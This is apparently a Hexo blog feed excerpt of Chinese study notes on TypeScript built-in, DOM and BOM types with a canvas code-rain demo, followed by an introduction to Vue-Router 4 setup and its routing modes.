<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="title class_">Boolean</span> = <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="title class_">Number</span> = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">s</span>: <span class="title class_">String</span> = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;yajue&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">d</span>: <span class="title class_">Date</span> = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">r</span>: <span class="title class_">RegExp</span> = <span class="regexp">/^1/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(r)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">e</span>: <span class="title class_">Error</span> = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;omg&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">xhr</span>: <span class="title class_">XMLHttpRequest</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr)</span><br></pre></td></tr></table></figure>

<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p>DOM节点的类型名通常为HTML[某某某]Element，节点集的类型为NodeList或者NodeListOf&lt;[节点类型]&gt;</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 节点</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">div</span>:<span class="title class_">HTMLDivElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;div&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">input</span>:<span class="title class_">HTMLInputElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;input&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">p</span>:<span class="title class_">HTMLParagraphElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;p&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 节点集</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">divs</span>:<span class="title class_">NodeList</span> = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;div&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">nodes</span>:<span class="title class_">NodeListOf</span>&lt;<span class="title class_">HTMLInputElement</span>|<span class="title class_">HTMLDivElement</span>&gt; = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.omg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有时需要加入类型断言，因为节点存在读不到的可能，读不到会返回null</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">div2</span>:<span class="title class_">HTMLDivElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>) <span class="keyword">as</span> <span class="title class_">HTMLDivElement</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// //dom元素的映射表</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">HTMLElementTagNameMap</span> &#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: <span class="title class_">HTMLAnchorElement</span>;</span><br><span class="line">    <span class="string">&quot;abbr&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;area&quot;</span>: <span class="title class_">HTMLAreaElement</span>;</span><br><span class="line">    <span class="string">&quot;article&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;aside&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;audio&quot;</span>: <span class="title class_">HTMLAudioElement</span>;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;base&quot;</span>: <span class="title class_">HTMLBaseElement</span>;</span><br><span class="line">    <span class="string">&quot;bdi&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;bdo&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;blockquote&quot;</span>: <span class="title class_">HTMLQuoteElement</span>;</span><br><span class="line">    <span class="string">&quot;body&quot;</span>: <span class="title class_">HTMLBodyElement</span>;</span><br><span class="line">    <span class="string">&quot;br&quot;</span>: <span class="title class_">HTMLBRElement</span>;</span><br><span class="line">    <span class="string">&quot;button&quot;</span>: <span class="title class_">HTMLButtonElement</span>;</span><br><span class="line">    <span class="string">&quot;canvas&quot;</span>: <span class="title class_">HTMLCanvasElement</span>;</span><br><span class="line">    <span class="string">&quot;caption&quot;</span>: <span class="title class_">HTMLTableCaptionElement</span>;</span><br><span class="line">    <span class="string">&quot;cite&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;col&quot;</span>: <span class="title class_">HTMLTableColElement</span>;</span><br><span class="line">    <span class="string">&quot;colgroup&quot;</span>: <span class="title class_">HTMLTableColElement</span>;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: <span class="title class_">HTMLDataElement</span>;</span><br><span class="line">    <span class="string">&quot;datalist&quot;</span>: <span class="title class_">HTMLDataListElement</span>;</span><br><span class="line">    <span class="string">&quot;dd&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;del&quot;</span>: <span class="title class_">HTMLModElement</span>;</span><br><span class="line">    <span class="string">&quot;details&quot;</span>: <span class="title class_">HTMLDetailsElement</span>;</span><br><span class="line">    <span class="string">&quot;dfn&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;dialog&quot;</span>: <span class="title class_">HTMLDialogElement</span>;</span><br><span class="line">    <span class="string">&quot;div&quot;</span>: <span class="title class_">HTMLDivElement</span>;</span><br><span class="line">    <span class="string">&quot;dl&quot;</span>: <span class="title class_">HTMLDListElement</span>;</span><br><span class="line">    <span class="string">&quot;dt&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;em&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;embed&quot;</span>: <span class="title class_">HTMLEmbedElement</span>;</span><br><span class="line">    <span class="string">&quot;fieldset&quot;</span>: <span class="title class_">HTMLFieldSetElement</span>;</span><br><span class="line">    <span class="string">&quot;figcaption&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;figure&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;footer&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;form&quot;</span>: <span class="title class_">HTMLFormElement</span>;</span><br><span class="line">    <span class="string">&quot;h1&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;h2&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;h3&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;h4&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;h5&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;h6&quot;</span>: <span class="title class_">HTMLHeadingElement</span>;</span><br><span class="line">    <span class="string">&quot;head&quot;</span>: <span class="title class_">HTMLHeadElement</span>;</span><br><span class="line">    <span class="string">&quot;header&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;hgroup&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;hr&quot;</span>: <span class="title class_">HTMLHRElement</span>;</span><br><span class="line">    <span class="string">&quot;html&quot;</span>: <span class="title class_">HTMLHtmlElement</span>;</span><br><span class="line">    <span class="string">&quot;i&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;iframe&quot;</span>: <span class="title class_">HTMLIFrameElement</span>;</span><br><span class="line">    <span class="string">&quot;img&quot;</span>: <span class="title class_">HTMLImageElement</span>;</span><br><span class="line">    <span class="string">&quot;input&quot;</span>: <span class="title class_">HTMLInputElement</span>;</span><br><span class="line">    <span class="string">&quot;ins&quot;</span>: <span class="title class_">HTMLModElement</span>;</span><br><span class="line">    <span class="string">&quot;kbd&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;label&quot;</span>: <span class="title class_">HTMLLabelElement</span>;</span><br><span class="line">    <span class="string">&quot;legend&quot;</span>: <span class="title class_">HTMLLegendElement</span>;</span><br><span class="line">    <span class="string">&quot;li&quot;</span>: <span class="title class_">HTMLLIElement</span>;</span><br><span class="line">    <span class="string">&quot;link&quot;</span>: <span class="title class_">HTMLLinkElement</span>;</span><br><span class="line">    <span class="string">&quot;main&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;map&quot;</span>: <span class="title class_">HTMLMapElement</span>;</span><br><span class="line">    <span class="string">&quot;mark&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;menu&quot;</span>: <span class="title class_">HTMLMenuElement</span>;</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: <span class="title class_">HTMLMetaElement</span>;</span><br><span class="line">    <span class="string">&quot;meter&quot;</span>: <span class="title class_">HTMLMeterElement</span>;</span><br><span class="line">    <span class="string">&quot;nav&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;noscript&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;object&quot;</span>: <span class="title class_">HTMLObjectElement</span>;</span><br><span class="line">    <span class="string">&quot;ol&quot;</span>: <span class="title class_">HTMLOListElement</span>;</span><br><span class="line">    <span class="string">&quot;optgroup&quot;</span>: <span class="title class_">HTMLOptGroupElement</span>;</span><br><span class="line">    <span class="string">&quot;option&quot;</span>: <span class="title class_">HTMLOptionElement</span>;</span><br><span class="line">    <span class="string">&quot;output&quot;</span>: <span class="title class_">HTMLOutputElement</span>;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="title class_">HTMLParagraphElement</span>;</span><br><span class="line">    <span class="string">&quot;picture&quot;</span>: <span class="title class_">HTMLPictureElement</span>;</span><br><span class="line">    <span class="string">&quot;pre&quot;</span>: <span class="title class_">HTMLPreElement</span>;</span><br><span class="line">    <span class="string">&quot;progress&quot;</span>: <span class="title class_">HTMLProgressElement</span>;</span><br><span class="line">    <span class="string">&quot;q&quot;</span>: <span class="title class_">HTMLQuoteElement</span>;</span><br><span class="line">    <span class="string">&quot;rp&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;rt&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;ruby&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;samp&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;script&quot;</span>: <span class="title class_">HTMLScriptElement</span>;</span><br><span class="line">    <span class="string">&quot;section&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;select&quot;</span>: <span class="title class_">HTMLSelectElement</span>;</span><br><span class="line">    <span class="string">&quot;slot&quot;</span>: <span class="title class_">HTMLSlotElement</span>;</span><br><span class="line">    <span class="string">&quot;small&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;source&quot;</span>: <span class="title class_">HTMLSourceElement</span>;</span><br><span class="line">    <span class="string">&quot;span&quot;</span>: <span class="title class_">HTMLSpanElement</span>;</span><br><span class="line">    <span class="string">&quot;strong&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;style&quot;</span>: <span class="title class_">HTMLStyleElement</span>;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;summary&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;sup&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;table&quot;</span>: <span class="title class_">HTMLTableElement</span>;</span><br><span class="line">    <span class="string">&quot;tbody&quot;</span>: <span class="title class_">HTMLTableSectionElement</span>;</span><br><span class="line">    <span class="string">&quot;td&quot;</span>: <span class="title class_">HTMLTableCellElement</span>;</span><br><span class="line">    <span class="string">&quot;template&quot;</span>: <span class="title class_">HTMLTemplateElement</span>;</span><br><span class="line">    <span class="string">&quot;textarea&quot;</span>: <span class="title class_">HTMLTextAreaElement</span>;</span><br><span class="line">    <span class="string">&quot;tfoot&quot;</span>: <span class="title class_">HTMLTableSectionElement</span>;</span><br><span class="line">    <span class="string">&quot;th&quot;</span>: <span class="title class_">HTMLTableCellElement</span>;</span><br><span class="line">    <span class="string">&quot;thead&quot;</span>: <span class="title class_">HTMLTableSectionElement</span>;</span><br><span class="line">    <span class="string">&quot;time&quot;</span>: <span class="title class_">HTMLTimeElement</span>;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="title class_">HTMLTitleElement</span>;</span><br><span class="line">    <span class="string">&quot;tr&quot;</span>: <span class="title class_">HTMLTableRowElement</span>;</span><br><span class="line">    <span class="string">&quot;track&quot;</span>: <span class="title class_">HTMLTrackElement</span>;</span><br><span class="line">    <span class="string">&quot;u&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;ul&quot;</span>: <span class="title class_">HTMLUListElement</span>;</span><br><span class="line">    <span class="string">&quot;var&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">    <span class="string">&quot;video&quot;</span>: <span class="title class_">HTMLVideoElement</span>;</span><br><span class="line">    <span class="string">&quot;wbr&quot;</span>: <span class="title class_">HTMLElement</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h1><p>和ES内置类型的规则差不多</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">local</span>:<span class="title class_">Storage</span> = <span class="variable language_">localStorage</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">lo</span>:<span class="title class_">Location</span> = location</span><br><span class="line"><span class="comment">// Promise是泛型形式</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">promise</span>:<span class="title class_">Promise</span>&lt;<span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span>=&gt;</span><span class="title function_">r</span>(<span class="number">123</span>))</span><br><span class="line"><span class="keyword">let</span> <span class="attr">cookie</span>:<span class="built_in">string</span> = <span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure>

<h1 id="代码雨案例"><a href="#代码雨案例" class="headerlink" title="代码雨案例"></a>代码雨案例</h1><p><a href="/extra/codeRain/index.html" target="_blank">效果</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    * &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取画布</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">canvas</span>:<span class="title class_">HTMLCanvasElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;canvas&quot;</span>)</span><br><span class="line"><span class="comment">// 获取画笔</span></span><br><span class="line"><span class="keyword">let</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>)</span><br><span class="line"><span class="comment">// 设置画布宽高</span></span><br><span class="line">canvas.<span class="property">width</span> = screen.<span class="property">availWidth</span>    <span class="comment">// 可视区的宽度</span></span><br><span class="line">canvas.<span class="property">height</span> = screen.<span class="property">availHeight</span>  <span class="comment">// 可视区的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码雨中的文字</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">str</span>:<span class="built_in">string</span>[] = <span class="string">&quot;01&quot;</span>.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">// 用数组维护代码雨的高度</span></span><br><span class="line"><span class="comment">// 每列宽10px，所以总共有canvas.withd/10列，把数组先填充0</span></span><br><span class="line"><span class="keyword">let</span> arr = <span class="title class_">Array</span>(<span class="title class_">Math</span>.<span class="title function_">ceil</span>(canvas.<span class="property">width</span>/<span class="number">10</span>)).<span class="title function_">fill</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rain</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// 绘制背景</span></span><br><span class="line">  ctx.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(0,0,0,0.05)&quot;</span></span><br><span class="line">  ctx.<span class="title function_">fillRect</span>(<span class="number">0</span>,<span class="number">0</span>,canvas.<span class="property">width</span>,canvas.<span class="property">height</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绘制文字</span></span><br><span class="line">  ctx.<span class="property">fillStyle</span> = <span class="string">&quot;#0f0&quot;</span></span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item,index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 在str中随机选取某个字，绘制到canvas上</span></span><br><span class="line">    ctx.<span class="title function_">fillText</span>(str[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*str.<span class="property">length</span>)],index*<span class="number">10</span>,item+<span class="number">10</span>)</span><br><span class="line">    <span class="comment">// 如果超出canvas的高度，就重新走一列，否则接着向下走</span></span><br><span class="line">    <span class="comment">// 再给一个随机数值，让文字有概率不落在底端也重新走，从而出现凌乱的效果</span></span><br><span class="line">    arr[index] = (item&gt;canvas.<span class="property">height</span> || item&gt;<span class="number">10000</span>*<span class="title class_">Math</span>.<span class="title function_">random</span>())?<span class="number">0</span>:item+<span class="number">10</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 不用清空画布，因为要做出渐变的效果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(rain,<span class="number">40</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-Router概述</title>
    <url>/web/study/Vue-Router/1.Vue-Router%E6%A6%82%E8%BF%B0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue-Router"></a>Vue-Router</h1><p>router意为路由。</p>
<p>Vue是单页面应用，没有那么多html文件，所以要使用路由做页面的跳转</p>
<p>Vue-Router允许用户通过不同的URL访问不同的内容，通过Vue可以实现多视图的单页面Web应用</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用Vue3则安装Vue-Router4；使用Vue2则安装Vue-Router3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-router@4 -s</span><br></pre></td></tr></table></figure>

<p>在main.ts中注册Vue-Router：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue-Router也是一个插件，所以需要注册</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">use</span>(router).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>创建Vue-Router配置文件&#x2F;src&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>:<span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 路径</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="comment">// 对应的组件，可以把组件当一个页面使用</span></span><br><span class="line">    <span class="comment">// import函数形式，打包的时候实现代码分割</span></span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/login.vue&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/reg&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/reg.vue&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>准备两个路由组件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    login</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.login &#123;</span><br><span class="line">  background-color: red;</span><br><span class="line">  height: 400px;</span><br><span class="line">  width: 400px;</span><br><span class="line">  font-size: 20px;</span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;reg&quot;&gt;</span><br><span class="line">    register</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.reg &#123;</span><br><span class="line">  background-color: blue;</span><br><span class="line">  height: 400px;</span><br><span class="line">  width: 400px;</span><br><span class="line">  font-size: 20px;</span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>在App.vue中控制路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;!-- router跳转的按钮，会被解析成a标签 --&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;login&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;reg&lt;/router-link&gt;</span><br><span class="line">        </span><br><span class="line">      &lt;!-- 直接用a标签时，会触发默认行为，页面会闪一下 --&gt;</span><br><span class="line">      &lt;!-- &lt;a href=&quot;/&quot;&gt;Login&lt;/a&gt; --&gt;</span><br><span class="line">      &lt;!-- &lt;a href=&quot;/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;Reg&lt;/a&gt; --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;!-- 需要容器存放router的内容 --&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Vue-Router模式"><a href="#Vue-Router模式" class="headerlink" title="Vue-Router模式"></a>Vue-Router模式</h1><p>Vue2中的模式配置项为mode，Vue3为history</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>Vue2</th>
<th>Vue3</th>
</tr>
</thead>
<tbody><tr>
<td>hash</td>
<td>mode hash</td>
<td>createWebHashHistory</td>
</tr>
<tr>
<td>history</td>
<td>mode history</td>
<td>createWebHistory</td>
</tr>
<tr>
<td>abstract</td>
<td>mode abstract</td>
<td>createMemoryHistory</td>
</tr>
</tbody></table>
<p>平时一般使用history或hash模式，服务端SSR渲染时默认自动开启abstract模式</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>history提供了pushState和replaceState两个方法，这两个方法改变URL的path部分不会引起页面刷新</p>
<p>history提供类似hashchange事件的popstate事件，但popstate事件有些不同：</p>
<ol>
<li>通过浏览器前进后退改变URL时会触发popstate事件</li>
<li>通过pushState&#x2F;replaceState或&lt;a&gt;标签改变URL不会触发popstate事件<ul>
<li>但是可以通过拦截pushState&#x2F;replaceState的调用和绑定&lt;a&gt;标签的点击事件检测URL变化</li>
</ul>
</li>
<li>通过js调用history的back, go, forward方法时会触发popstate事件</li>
</ol>
<p>所以history模式监听URL变化可以实现，只是没有hash模式的hashchange那么方便</p>
<h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>URL中hash(#)及后面的部分，常用作锚点在页面内进行导航，改变URL中的hash部分不会引起页面刷新</p>
<p>可以通过hashchange事件监听URL的变化</p>
